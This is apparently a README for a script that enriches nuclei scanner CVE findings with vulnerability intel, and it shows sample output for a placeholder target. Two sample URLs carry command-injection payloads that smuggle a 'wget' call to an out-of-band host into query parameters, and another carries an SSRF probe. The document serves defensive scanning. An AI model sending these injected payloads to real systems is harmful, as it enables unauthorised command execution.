# nuclei-nvi
# Enriches nuclei CVE results with vulnerability intel from NVI platform - https://www.northinfosec.com/ 

Simple usage:

nuclei -target http://sample.nuclei-target.com --silent | python3  nuclei-nvi.py  

----------------------------------------

Template ID: CVE-2014-3206
Category: http
Nuclei rating: critical
URL: http://sample.nuclei-target.com/backupmgt/localJob.php?session=fail;wget+http://cqqf5fng4vbb67d6ath09hcfohi51hmyx.oast.site;
Intel: NVI risk_rating => High | Public exploit => No_Known_exploit | Ransomware => no | kev => yes 

----------------------------------------

Template ID: CVE-2016-1555
Category: http
Nuclei rating: critical
URL: http://sample.nuclei-target.com/boardDataWW.php
Intel: NVI risk_rating => Critical | Public exploit => poc | Ransomware => no | kev => yes 

----------------------------------------

Template ID: CVE-2017-9506
Category: http
Nuclei rating: medium
URL: http://sample.nuclei-target.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://cqqf5fng4vbb67d6ath059tkk51qewsbf.oast.site
Intel: NVI risk_rating => Critical | Public exploit => PoC | Ransomware => No | kev => Yes 

----------------------------------------

Template ID: CVE-2017-3506
Category: http
Nuclei rating: high
URL: http://sample.nuclei-target.com/wls-wsat/RegistrationRequesterPortType
Intel: NVI risk_rating => Critical | Public exploit => PoC | Ransomware => No | kev => Yes 

----------------------------------------

Template ID: CVE-2014-3206
Category: http
Nuclei rating: critical
URL: http://sample.nuclei-target.com/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://cqqf5fng4vbb67d6ath05dc5mwird8dcc.oast.site;
Intel: NVI risk_rating => High | Public exploit => No_Known_exploit | Ransomware => no | kev => yes 

----------------------------------------

Template ID: CVE-2018-16167
Category: http
Nuclei rating: critical
URL: http://sample.nuclei-target.com/upload
Intel: NVI risk_rating => Critical | Public exploit => poc | Ransomware => no | kev => yes 

----------------------------------------

Template ID: CVE-2019-10758
Category: http
Nuclei rating: critical
URL: http://sample.nuclei-target.com/checkValid
Intel: NVI risk_rating => Critical | Public exploit => PoC | Ransomware => No | kev => Yes 

----------------------------------------

Template ID: CVE-2019-2616
Category: http
Nuclei rating: high
URL: http://sample.nuclei-target.com/xmlpserver/ReportTemplateService.xls
Intel: NVI risk_rating => Critical | Public exploit => Weaponized | Ransomware => No | kev => Yes 

----------------------------------------


